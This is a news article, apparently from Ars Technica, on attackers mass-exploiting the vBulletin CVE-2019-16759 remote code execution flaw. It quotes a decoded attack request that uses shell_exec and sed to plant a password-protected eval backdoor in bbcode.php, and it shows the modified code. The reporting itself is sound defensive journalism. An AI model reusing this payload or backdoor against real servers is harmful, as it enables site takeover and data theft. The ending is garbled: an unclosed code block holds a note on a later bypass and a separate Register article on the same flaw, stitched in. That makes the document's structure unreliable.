Attackers are mass-exploiting an anonymously disclosed vulnerability that makes it possible to take control of servers running vBulletin, one of the Internet’s most popular applications for website comments. Sites running the app should take comments offline until administrators install a patch that vBulletin developers released late Wednesday morning.

The vulnerability was disclosed through an [18-line exploit](https://seclists.org/fulldisclosure/2019/Sep/31) that was published on Monday by an unidentified person. The exploit allows unauthenticated attackers to remotely execute malicious code on just about any vBulletin server running versions 5.0.0 up to 5.5.4. The vulnerability is so severe and easy to exploit that some critics have described it as a back door.

“Essentially, any attack exploits a super simple command injection,” Ryan Seguin, a research engineer at Tenable, told Ars. “An attacker sends the payload, vBulletin then runs the command, and it responds back to the attacker with whatever they asked for. If an attacker issues a shell command as part of the injection, vBulletin will run Linux commands on its host with whatever user permissions vBulletins' system-level user account has access to.” Seguin has more in [this technical analysis](https://www.tenable.com/blog/critical-zero-day-pre-authentication-remote-code-execution-exploit-published-for-5-x-versions) of the vulnerability.

According to researcher Troy Mursch of the Bad Packets security intelligence service, attackers are using botnets to actively exploit vulnerable servers. After decoding, some of the Web requests they send look like this:

`"widgetConfig[code]=echo shell_exec('sed -i \'s/eval(\$code);/if (isset(\$_REQUEST[\"epass\"]) \&\& \$_REQUEST[\"epass\"] == \"2dmfrb28nu3c6s9j\") { eval(\$code); }/g\' includes/vb5/frontend/controller/bbcode.php && echo -n exploited | md5sum'); exit;"`

Prior to the malicious Web request, code in a section of vBulletin called

```
includes/vb5/frontend/controller/bbcode.php
```

looked like this:

```
function evalCode($code)
{
    ob_start();
    eval($code);
    $output = ob_get_contents();
    ob_end_clean();
    return $output;
}
```

After the Web request has been sent, the same section is changed to this:

```
function evalCode($code)
{
    ob_start();
    if (isset($_REQUEST["epass"]) && $_REQUEST["epass"] == "2dmfrb28nu3c6s9j") { eval($code); }
    $output = ob_get_contents();
    ob_end_clean();
    return $output;
}
```

Mursch told Ars:

> The exploit above modifies
>
> ```
> includes/vb5/frontend/controller/bbcode.php
> ```
>
> via the "sed" command to add a backdoor to the code. This is done by setting a “password” (epass) of 2dmfrb28nu3c6s9j. By doing this, the compromised site will only execute code in the eval function if 2dmfrb28nu3c6s9j is set in future requests sent to the server. This would allow a botnet command-and-control (C2) server to exclusively exploit CVE-2019-16759 and issue commands to the targeted site.
>
> The vulnerability itself has been regarded by some as a backdoor. This exploit attempt basically backdoors sites via a backdoor. As for why threat actors are doing this, it's likely to build an inventory of bots while they figure additional ways to exploit the compromised hosts – such as infecting them with DDoS malware and conducting denial-of-service attacks.

Some of the infected computers carrying out the attacks have been spotted in the past using the EternalBlue exploit, developed by and later stolen from the National Security Agency, to compromise computers that have yet to install a patch Microsoft released in early 2017.

Some vBulletin users took to the software’s official support pages on Wednesday to report they had been hacked. “I received an email today from my hosting provider stating that ‘malicious code was detected on your website and a huge number of email spam messages originating from it,’” one user [wrote here](https://forum.vbulletin.com/forum/vbulletin-5-connect/vbulletin-5-connect-questions-problems-troubleshooting/vbulletin-5-support-issues-questions/4422704-vbulletin-forum-infected-with-malicious-code) (free account required). Another user reported having an entire MySQL database deleted.

vBulletin is among the most widely used website commenting systems and is probably used on tens of thousands—possibly hundreds of thousands—of sites. Fortunately, version 5x makes up less than 7% of active installations, [according to W3techs](https://w3techs.com/technologies/details/cm-vbulletin/all/all), a site that surveys the software used across the Internet. Still, Internet searches like [this one](https://www.google.com/search?safe=active&source=hp&ei=ksqLXaGXKLLS9APa3L7wCA&q=%22Powered+by+vBulletin+Version+5.%22&oq=%22Powered+by+vBulletin+Version+5.%22&gs_l=psy-ab.3..0i22i30l2.1036.1036..1806...0.0..0.99.99.1......0....2j1..gws-wiz.4Ulj2Sd7lvg&ved=0ahUKEwihqJHe5OzkAhUyKX0KHVquD44Q4dUDCAg&uact=5) suggest that 10,000 or more sites may be running vulnerable versions.

## Exploit available for years

According to Chaouki Bekrar, founder and CEO of the Zerodium exploit broker, the vulnerability has been privately circulating for years.

> The recent vBulletin pre-auth RCE 0day disclosed by a researcher on full-disclosure looks like a bugdoor, a perfect candidate for [@PwnieAwards](https://twitter.com/PwnieAwards?ref_src=twsrc%5Etfw) 2020. Easy to spot and exploit.
>
> Many researchers were selling this exploit for years. [@Zerodium](https://twitter.com/Zerodium?ref_src=twsrc%5Etfw) customers were aware of it since 3 years
>
> — Chaouki Bekrar (@cBekrar) [September 25, 2019](https://twitter.com/cBekrar/status/1176803541047861249?ref_src=twsrc%5Etfw)

“Many researchers were selling this exploit for years,” he [wrote on Twitter](https://twitter.com/cBekrar/status/1176803541047861249). “Zerodium customers were aware of it since 3 years.”

The availability of a working exploit is aggravated by [another publicly posted script](https://github.com/Frint0/mass-pwn-vbulletin) that uses the Shodan search site to find vulnerable servers. Attackers can use it to generate a list of vBulletin sites that are susceptible and then use the exploit to take them over.

The vulnerability—which is tracked as [CVE-2019-16759](https://nvd.nist.gov/vuln/detail/CVE-2019-16759)—exists in default installations of the affected versions. According to Tenable’s publicly posted analysis, “an unauthenticated attacker can send a specially crafted HTTP POST request to a vulnerable vBulletin host and execute commands. These commands would be executed with the permissions of the user account that the vBulletin service is utilizing. Depending on the service user’s permissions, this could allow complete control of a host.”

As advised earlier, the vulnerability is so severe that vulnerable vBulletin users should take their forums offline until they have installed a [patch developers published](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4422707-vbulletin-security-patch-released-versions-5-5-2-5-53-and-5-5-4) on Wednesday morning. The [commenting system for Defcon.org](https://forum.defcon.org/), a site that’s regularly probed for easy-to-hack vulnerabilities, was non-operational at the time this post went live. Several hours later the user forum returned.

Defcon founder Jeff Moss, told Ars his team took the site down to avoid getting hacked.

"We tested it right away and none of our defenses would have saved us," he said. "We checked logs and such and no attempts to attack us, but after we went back one line there were two in the first 30 minutes. Definitely active attackers."

Before a patch was available, people reported that they were able to successfully mitigate the vulnerability by following the instructions [here](https://twitter.com/nickcano93/status/1176758990753026048). Now that a patch is available, affected vBulletin users should install it at once.

*This post was updated to add exploit details from Mursch and comments from Moss.*

```
vBulletin 5.5.4 through 5.6.2 are vulnerable to a remote code execution
vulnerability caused by incomplete patching of the previous
"CVE-2019-16759" RCE. This logic bug allows for a single pre-auth request
to execute PHP code on a target vBulletin forum.

## Hackers can inject system commands via version 5 of software, no patch available

Updated An anonymous bug hunter has publicly disclosed a zero-day flaw in the version 5 of the popular vBulletin forum software than can be exploited over the internet to hijack servers. No patch is known to be available.

The security hole was revealed last night in a post to the [Full Disclosure](https://seclists.org/fulldisclosure/2019/Sep/31) mailing list: the message exactly explains how a simple HTTP POST request can be abused by an attacker to remotely execute commands on the targeted vBulletin server without any authentication. That would allow hackers to commandeer web servers powering the forum software, steal data, tamper with information, launch assaults on other systems, and so on.

It can be done in fewer than 20 lines of Python code. This is a very, very, bad thing.

The zero-day exploit code is verified to work against supported versions of vBulletin from 5.0.0 to the latest 5.5.4 build.

*The Register* has asked vBulletin for comment on the report, or an estimate on when a fix could be out, but so far we have yet to hear back.

Meanwhile, security professionals are marveling at the simplicity of the exploit and the extent to which vulnerable boards can be owned by the attack.

Websites running vBulletin version 5, first released in 2012, are advised to keep a close eye on their servers and make sure that nobody is attempting to exploit the vulnerability and use it as a springboard for further attacks. Better yet, maybe just pull the plug completely until a fix or mitigation lands.

Unfortunately, as security researchers have noted, vBulletin's customer base [includes](https://twitter.com/0xUID/status/1176582347648643073) a number of large companies, sports teams, and entertainment groups that are likely now exposed until such time as the developer can figure out a fix. ®

### Updated to add

Patches are [now available](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4422707-vbulletin-security-patch-released-versions-5-5-2-5-5-3-and-5-5-4) for the aforementioned security hole, and should be installed ASAP. A technical description of the flaw can be found [here](https://www.tenable.com/blog/critical-zero-day-pre-authentication-remote-code-execution-exploit-published-for-5-x-versions) – and apparently hackers were privately selling exploits for this particular hole for "years."

> The recent vBulletin pre-auth RCE 0day disclosed by a researcher on full-disclosure looks like a bugdoor, a perfect candidate for [@PwnieAwards](https://twitter.com/PwnieAwards?ref_src=twsrc%5Etfw) 2020. Easy to spot and exploit.
